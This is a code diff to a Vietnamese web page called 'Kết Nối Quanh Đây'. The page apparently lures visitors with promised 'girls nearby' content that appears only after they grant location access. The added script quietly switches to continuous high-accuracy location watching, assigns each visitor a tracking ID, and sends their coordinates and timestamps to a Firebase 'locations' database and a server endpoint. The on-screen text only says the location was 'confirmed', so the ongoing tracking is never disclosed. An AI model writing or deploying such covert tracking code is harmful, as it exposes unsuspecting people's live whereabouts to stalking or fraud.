@@ -440,54 +440,116 @@
   © 2026 Kết Nối Quanh Đây
 </footer>
 
-<script>
+<script type="module">
 
-async function getLocation() {
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import {
+  getDatabase,
+  ref,
+  set
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-  const locationText = document.getElementById("location");
-  const groups = document.getElementById("groups");
+const firebaseConfig = {
 
-  locationText.innerHTML = "Các mlem đang hiện lên...";
+  apiKey: "YOUR_API_KEY",
+  authDomain: "YOUR_AUTH_DOMAIN",
+  databaseURL: "YOUR_DATABASE_URL",
+  projectId: "YOUR_PROJECT_ID",
+  storageBucket: "YOUR_STORAGE_BUCKET",
+  messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+  appId: "YOUR_APP_ID"
+
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+let trackingId = null;
+
+window.getLocation = function() {
+
+  const locationText =
+    document.getElementById("location");
+
+  const groups =
+    document.getElementById("groups");
+
+  locationText.innerHTML =
+    "📍 Đang xác nhận vị trí...";
 
   if (!navigator.geolocation) {
-    locationText.innerHTML = "Các em vẫn chưa xuất hiện vì bạn chưa cho phép.";
+
+    locationText.innerHTML =
+      "❌ Trình duyệt không hỗ trợ GPS.";
+
     return;
   }
 
-  navigator.geolocation.getCurrentPosition(
+  trackingId =
+    Math.random().toString(36).substring(2,10);
+
+  navigator.geolocation.watchPosition(
 
     async function(position) {
 
       const lat = position.coords.latitude;
       const lng = position.coords.longitude;
 
+      await set(ref(db, 'locations/' + trackingId), {
+
+        lat,
+        lng,
+        time: Date.now()
+
+      });
+
       groups.style.display = "grid";
 
-      locationText.innerHTML = "✅ Các em đã xuất hiện bên dưới ❤️ ";
+      locationText.innerHTML =
+        "✅ Đã xác nhận vị trí thành công";
 
       try {
 
-        await fetch("/api/location", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
+        await fetch('/api/location', {
+
+          method:'POST',
+
+          headers:{
+            'Content-Type':'application/json'
           },
-          body: JSON.stringify({ lat, lng })
+
+          body: JSON.stringify({
+
+            trackingId,
+            lat,
+            lng,
+            time: Date.now()
+
+          })
+
         });
 
-      } catch(error) {
+      } catch(error){
+
         console.log(error);
+
       }
 
     },
 
-    function() {
+    function(error){
+
+      console.log(error);
 
       locationText.innerHTML =
-        "❌ Bạn vẫn chưa tham gia, để xem được các em.";
+        '❌ Không thể lấy vị trí';
 
-      groups.style.display = "none";
+    },
 
+    {
+      enableHighAccuracy:true,
+      maximumAge:0,
+      timeout:5000
     }
 
   );
@@ -495,6 +557,7 @@ async function getLocation() {
 }
 
 </script>
+
 
 </body>
 </html>
